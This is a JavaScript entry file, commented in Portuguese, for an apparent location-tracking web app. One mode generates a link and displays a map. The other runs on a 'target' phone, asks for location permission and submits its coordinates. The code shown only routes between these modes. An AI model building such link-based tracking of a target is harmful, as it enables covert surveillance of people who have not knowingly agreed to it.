import { initializeTracker } from './tracker.js';
import { initializeSubmitter } from './submitter.js';

function getUrlParameter(name) {
    name = name.replace(/[\\[]/, '\\[').replace(/[\\]]/, '\\]');
    const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
    const results = regex.exec(location.search);
    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
}

document.addEventListener('DOMContentLoaded', () => {
    // Verifica se há um parâmetro de sessão na URL
    const sessionId = getUrlParameter('session');

    if (sessionId) {
        // Modo 2: Submissor (Celular alvo)
        console.log("Modo: Submissão de Localização. Session ID:", sessionId);
        // O submitter vai pedir permissão de localização e tentar enviar os dados.
        initializeSubmitter(sessionId);
    } else {
        // Modo 1: Rastreador (Gerador de link e Visualizador de Mapa)
        console.log("Modo: Rastreador/Gerador de Link.");
        // O tracker gera o link e espera pelos dados.
        initializeTracker();
    }
});